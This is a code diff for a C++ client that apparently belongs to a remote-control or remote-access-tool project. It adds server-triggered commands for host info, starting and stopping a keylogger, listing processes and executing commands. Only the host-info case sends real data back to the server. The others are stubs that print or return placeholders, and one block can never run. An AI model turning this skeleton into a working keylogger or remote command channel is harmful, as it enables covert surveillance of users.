@@ -3,9 +3,6 @@
 
 LPTF_Client::LPTF_Client(const string &ip, int port)
 {
-    SystemInfo systemInfo;
-    cout << systemInfo.getAllInfo() << endl;
-
     if (!socket.create())
     {
         throw runtime_error("Socket creation failed");
@@ -34,18 +31,18 @@ void LPTF_Client::sendPacketFromString(const string &message, CommandType type)
     }
 }
 
-void LPTF_Client::receivePacketAndPrint()
+bool LPTF_Client::receivePacketAndPrint()
 {
     uint8_t header[2];
     if (!socket.receiveAllPackets(header, 2)) {
         cerr << "Error: Failed to receive packet header." << endl;
-        return;
+        return false;
     }
 
     uint16_t packetSize = (header[0] << 8) | header[1];
     if (packetSize < 3) {
         cerr << "Error: Invalid packet size." << endl;
-        return;
+        return false;
     }
 
     vector<uint8_t> data(packetSize);
@@ -54,17 +51,18 @@ void LPTF_Client::receivePacketAndPrint()
 
     if (!socket.receiveAllPackets(data.data() + 2, packetSize - 2)) {
         cerr << "Error: Failed to receive the full packet." << endl;
-        return;
+        return false;
     }
     try {
-        LPTF_Packet response = LPTF_Packet::deserialize(data);
-        string reply(response.getPayload().begin(), response.getPayload().end());
-        cout << "[Server] : " << reply << "\n";
+        LPTF_Packet packet = LPTF_Packet::deserialize(data);
+        handleCommand(packet);
+
     } catch (const exception& e) {
         cerr << "Error: Deserialization failed - " << e.what() << endl;
+        return false;
     }
+    return true;
 }
-
 
 void LPTF_Client::run()
 {
@@ -82,7 +80,10 @@ void LPTF_Client::run()
         int activity = select(0, &readfds, nullptr, nullptr, &timeout);
         if (activity > 0 && FD_ISSET(socket.get_fd(), &readfds))
         {
-            receivePacketAndPrint();
+        if (!receivePacketAndPrint()) {
+                cerr << "[Client] : Connection closed or failed during read.\n";
+                break;
+            }
         }
 
         if (_kbhit())
@@ -93,9 +94,65 @@ void LPTF_Client::run()
 
             if (input == "exit")
                 break;
-            sendPacketFromString(input, CommandType::HOST_INFO_RESPONSE);
+            sendPacketFromString(input, CommandType::SEND_MESSAGE);
+        }
+        this_thread::sleep_for(chrono::milliseconds(50));
+    }
+}
+
+void LPTF_Client::handleCommand(const LPTF_Packet& packet)
+{
+    string payload(packet.getPayload().begin(), packet.getPayload().end());
+    CommandType type = static_cast<CommandType>(packet.getType());
+
+    switch (type)
+    {
+        case CommandType::HOST_INFO_REQUEST:
+        {
+            string info = SystemInfo::getAllInfo();
+            sendPacketFromString(info, CommandType::HOST_INFO_RESPONSE);
+            break;
         }
 
-        this_thread::sleep_for(chrono::milliseconds(50));
+        case CommandType::START_KEYLOGGER_REQUEST:
+        {
+            cout << "[Client] : Starting keylogger..." << endl;
+            break;
+        }
+
+        case CommandType::STOP_KEYLOGGER_REQUEST:
+        {
+            cout << "[Client] : Stopping keylogger..." << endl;
+            break;
+        }
+        case CommandType::LIST_PROCESSES_REQUEST:
+        {
+            string processes = "[Fake process list]";
+            sendPacketFromString(processes, CommandType::PROCESS_LIST_RESPONSE);
+            break;
+        }
+        {
+            string processes = "[Fake process list]";
+            sendPacketFromString(processes, CommandType::PROCESS_LIST_RESPONSE);
+            break;
+        }
+
+        case CommandType::EXECUTE_COMMAND_REQUEST:
+        {
+            string result = "[Command executed: " + payload + "]";
+            sendPacketFromString(result, CommandType::COMMAND_RESULT_RESPONSE);
+            break;
+        }
+
+        case CommandType::SEND_MESSAGE:
+        {
+            cout << "[Server Message] : " << payload << endl;
+            break;
+        }
+        default:
+        {
+            cerr << "[Client] : Unknown command type received: " << static_cast<int>(packet.getType()) << endl;
+            break;
+        }
     }
 }
